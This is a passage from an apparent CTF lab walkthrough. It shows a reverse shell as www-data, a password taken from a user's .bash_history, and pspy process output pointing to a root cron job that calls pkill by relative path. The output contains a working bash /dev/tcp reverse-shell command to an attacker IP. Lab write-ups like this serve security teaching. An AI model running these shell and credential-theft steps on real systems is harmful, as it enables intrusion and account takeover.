</span></span></code></pre></div><p>Open a netcat listener and we have reverse shell as <code>www-data</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>www-data@b2r:/var/www/html/cvs$ whoami
</span></span><span style=display:flex><span>www-data
</span></span></code></pre></div><p>There is an interesting file <code>.bash_history</code> in user&rsquo;s lachlan home directory (/home/lachlan), which contains the password of that user:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>www-data@b2r:/home/lachlan$ cat .bash_history
</span></span><span style=display:flex><span>./cve.sh
</span></span><span style=display:flex><span>./cve-patch.sh
</span></span><span style=display:flex><span>vi /etc/cron.d/persistence
</span></span><span style=display:flex><span>echo -e <span style=color:#e6db74>&#34;dHY5pzmNYoETv7SUaY\n[REDACTED]\n[REDACTED]&#34;</span> | passwd
</span></span><span style=display:flex><span>ls -sf /dev/null /home/lachlan/.bash_history
</span></span></code></pre></div><p>Next, we become user lachlan with the found password.</p><ul><li>Command: <code>su lachlan</code></li></ul><p>We can also read the first flag, user.txt:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>lachlan@b2r:/home/lachlan$ cat user.txt
</span></span><span style=display:flex><span>thm<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>After using this tool <code>https://github.com/DominicBreuker/pspy</code> in order to monitor processes without root permissions, we identified a process <code>pkill</code> running without absolute path.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>lachlan@b2r:/home/lachlan$ ./pspy64                                                                                                                      
</span></span><span style=display:flex><span>pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855                                                 
</span></span><span style=display:flex><span>                                                                                                                              
</span></span><span style=display:flex><span>                                                                                                                              
</span></span><span style=display:flex><span>     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                       
</span></span><span style=display:flex><span>    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                       
</span></span><span style=display:flex><span>    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                       
</span></span><span style=display:flex><span>    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                                       
</span></span><span style=display:flex><span>    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                       
</span></span><span style=display:flex><span>    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                        
</span></span><span style=display:flex><span>    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                        
</span></span><span style=display:flex><span>    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                         
</span></span><span style=display:flex><span>                   ░           ░ ░                                                                                            
</span></span><span style=display:flex><span>                               ░ ░                                                                                            
</span></span><span style=display:flex><span>                                                                                                                              
</span></span><span style=display:flex><span>Config: Printing events <span style=color:#f92672>(</span>colored<span style=color:#f92672>=</span>true<span style=color:#f92672>)</span>: processes<span style=color:#f92672>=</span>true | file-system-events<span style=color:#f92672>=</span>false <span style=color:#f92672>||</span>| Scannning <span style=color:#66d9ef>for</span> processes every 100ms and 
</span></span><span style=display:flex><span>on inotify events <span style=color:#f92672>||</span>| Watching directories: <span style=color:#f92672>[</span>/usr /tmp /etc /home /var /opt<span style=color:#f92672>]</span> <span style=color:#f92672>(</span>recursive<span style=color:#f92672>)</span> | <span style=color:#f92672>[]</span> <span style=color:#f92672>(</span>non-recursive<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Draining file system events due to startup...
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>95</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>94</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>93</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>911</span>    |
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>91</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>90</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>9</span>      | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>89</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>88</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>87</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>86</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>85</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>84</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>82</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>81</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>806</span>    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --w
</span></span><span style=display:flex><span>ait-for-signal 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>78</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>779</span>    | /usr/sbin/apache2 -k start 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>77</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>76</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>75</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>74</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>73</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>726</span>    | /usr/bin/ssm-agent-worker 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>72</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>71</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>709</span>    | sshd: /usr/sbin/sshd -D <span style=color:#f92672>[</span>listener<span style=color:#f92672>]</span> <span style=color:#ae81ff>0</span> of 10-100 startups 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>70</span>     |
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>69</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>683</span>    | /usr/sbin/ModemManager 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>649</span>    | /sbin/agetty -o -p -- <span style=color:#ae81ff>\u</span> --noclear tty1 linux 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>644</span>    | /sbin/agetty -o -p -- <span style=color:#ae81ff>\u</span> --keep-baud 115200,38400,9600 ttyS0 vt220 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>633</span>    | /usr/sbin/atd -f 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>630</span>    | /usr/lib/udisks2/udisksd 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>628</span>    | /lib/systemd/systemd-logind 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>623</span>    | /usr/lib/snapd/snapd 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>104</span>  PID<span style=color:#f92672>=</span><span style=color:#ae81ff>619</span>    | /usr/sbin/rsyslogd -n -iNONE 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>615</span>    | /usr/lib/policykit-1/polkitd --no-debug 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>611</span>    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>103</span>  PID<span style=color:#f92672>=</span><span style=color:#ae81ff>602</span>    | /usr/bin/dbus-daemon --system --address<span style=color:#f92672>=</span>systemd: --nofork --nopidfile --systemd
</span></span><span style=display:flex><span>-activation --syslog-only 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span>      | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>599</span>    | /usr/sbin/cron -f 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>593</span>    | /usr/bin/amazon-ssm-agent 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>592</span>    | /usr/lib/accountsservice/accounts-daemon 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>101</span>  PID<span style=color:#f92672>=</span><span style=color:#ae81ff>570</span>    | /lib/systemd/systemd-resolved 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>100</span>  PID<span style=color:#f92672>=</span><span style=color:#ae81ff>560</span>    | /lib/systemd/systemd-networkd 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>102</span>  PID<span style=color:#f92672>=</span><span style=color:#ae81ff>521</span>    | /lib/systemd/systemd-timesyncd 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>504</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>503</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>496</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>494</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>491</span>    |
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>483</span>    | /sbin/multipathd -d -s 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>482</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>481</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>480</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>479</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>      | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>372</span>    | /lib/systemd/systemd-udevd 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>364</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>343</span>    | /lib/systemd/systemd-journald 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>      | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>269</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>268</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2628</span>   | /lib/systemd/systemd-udevd 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2624</span>   | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>1001</span> PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2614</span>   | ./pspy64 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2609</span>   | /bin/sleep <span style=color:#ae81ff>51</span> 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2608</span>   | /bin/sleep <span style=color:#ae81ff>41</span> 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2607</span>   | /bin/sh -c /bin/sleep <span style=color:#ae81ff>51</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>for</span> f in <span style=color:#e6db74>`</span>/bin/ls /dev/pts<span style=color:#e6db74>`</span>; <span style=color:#66d9ef>do</span> /usr/bin/echo nope 
</span></span><span style=display:flex><span>&gt; /dev/pts/$f <span style=color:#f92672>&amp;&amp;</span> pkill -9 -t pts/$f; <span style=color:#66d9ef>done</span> 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2606</span>   | /bin/sleep <span style=color:#ae81ff>31</span> 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2605</span>   | /bin/sleep <span style=color:#ae81ff>21</span> 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2602</span>   | /bin/sh -c /bin/sleep <span style=color:#ae81ff>41</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>for</span> f in <span style=color:#e6db74>`</span>/bin/ls /dev/pts<span style=color:#e6db74>`</span>; <span style=color:#66d9ef>do</span> /usr/bin/echo nope 
</span></span><span style=display:flex><span>&gt; /dev/pts/$f <span style=color:#f92672>&amp;&amp;</span> pkill -9 -t pts/$f; <span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2601</span>   | /bin/sh -c /bin/sleep <span style=color:#ae81ff>31</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>for</span> f in <span style=color:#e6db74>`</span>/bin/ls /dev/pts<span style=color:#e6db74>`</span>; <span style=color:#66d9ef>do</span> /usr/bin/echo nope 
</span></span><span style=display:flex><span>&gt; /dev/pts/$f <span style=color:#f92672>&amp;&amp;</span> pkill -9 -t pts/$f; <span style=color:#66d9ef>done</span> 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2600</span>   | /bin/sh -c /bin/sleep <span style=color:#ae81ff>21</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>for</span> f in <span style=color:#e6db74>`</span>/bin/ls /dev/pts<span style=color:#e6db74>`</span>; <span style=color:#66d9ef>do</span> /usr/bin/echo nope 
</span></span><span style=display:flex><span>&gt; /dev/pts/$f <span style=color:#f92672>&amp;&amp;</span> pkill -9 -t pts/$f; <span style=color:#66d9ef>done</span> 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2595</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2594</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2593</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2592</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>1001</span> PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2455</span>   | sh 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2452</span>   | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>1001</span> PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2449</span>   | <span style=color:#f92672>(</span>sd-pam<span style=color:#f92672>)</span> 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>1001</span> PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2448</span>   | /lib/systemd/systemd --user 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2436</span>   | su lachlan 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>23</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>224</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>22</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>21</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2021</span>   | bash -i 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2020</span>   | sh -c bash -c <span style=color:#e6db74>&#39;exec bash -i &amp;&gt;/dev/tcp/10.8.200.50/443 &lt;&amp;1&#39;</span> 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>20</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>      | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1993</span>   |
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>198</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1976</span>   | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>19</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>18</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>170</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>17</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>16</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1585</span>   | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1536</span>   | /usr/sbin/apache2 -k start 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1534</span>   | /usr/sbin/apache2 -k start 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1533</span>   | /usr/sbin/apache2 -k start 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1515</span>   | /usr/sbin/apache2 -k start 
